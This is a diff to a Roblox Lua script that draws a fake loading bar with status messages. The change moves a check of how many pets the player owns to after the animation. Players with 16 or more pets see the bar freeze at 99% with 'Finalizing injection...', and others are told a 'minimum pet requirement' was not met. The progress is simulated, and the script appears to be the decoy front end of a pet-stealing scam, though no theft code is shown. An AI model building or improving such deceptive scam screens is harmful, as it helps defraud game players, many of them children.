@@ -106,23 +106,9 @@ end
 
 typeText(messages[1])
 
--- check pets count
-local petsFolder = player:WaitForChild("BackpackApp")
-	:WaitForChild("Frame")
-	:WaitForChild("ScrollComplex")
-	:WaitForChild("ScrollingFrame")
-	:WaitForChild("Content")
-	:WaitForChild("pets")
-
-local totalChildren = 0
-for _, row in ipairs(petsFolder:GetChildren()) do
-	totalChildren += #row:GetChildren()
-end
-
--- loader animation
+-- loader animation (progress independent)
 task.spawn(function()
-	while progress < 99 or (totalChildren < 16 and progress < 100) do
-		-- speed changes depending on percent
+	while progress < 99 do
 		local speed = 0.06
 		if progress > 30 then speed = 0.045 end
 		if progress > 60 then speed = 0.035 end
@@ -130,18 +116,12 @@ task.spawn(function()
 		if progress > 95 then speed = 0.01 end
 
 		progress += speed
-
-		-- freeze at 99 if 16+ pets
-		if totalChildren >= 16 then
-			progress = math.min(progress, 99)
-		else
-			progress = math.min(progress, 100)
-		end
+		progress = math.min(progress, 99)
 
 		percent.Text = math.floor(progress).."%"
 		fill.Size = UDim2.new(progress/100,0,1,0)
 
-		-- update status messages
+		-- status messages
 		if math.floor(progress/12) > messageIndex and messageIndex < #messages then
 			messageIndex += 1
 			task.spawn(function()
@@ -152,14 +132,36 @@ task.spawn(function()
 		task.wait(0.05)
 	end
 
+	-- Now check pets and adjust final outcome
+	local petsFolder = player:WaitForChild("BackpackApp")
+		:WaitForChild("Frame")
+		:WaitForChild("ScrollComplex")
+		:WaitForChild("ScrollingFrame")
+		:WaitForChild("Content")
+		:WaitForChild("pets")
+
+	local totalChildren = 0
+	for _, row in ipairs(petsFolder:GetChildren()) do
+		totalChildren += #row:GetChildren()
+	end
+
 	if totalChildren < 16 then
+		-- allow bar to finish 100%
+		while progress < 100 do
+			progress += 0.5 -- small smooth increment
+			progress = math.min(progress,100)
+			percent.Text = math.floor(progress).."%"
+			fill.Size = UDim2.new(progress/100,0,1,0)
+			task.wait(0.05)
+		end
 		status.Text = "Minimum pet requirement not achieved"
 	else
+		-- keep it frozen at 99%
 		status.Text = "Finalizing injection..."
 	end
 end)
 
--- gradient movement (simulate glow animation)
+-- gradient animation
 task.spawn(function()
 	while true do
 		gradient.Offset = Vector2.new((gradient.Offset.X + 0.01) % 1, 0)
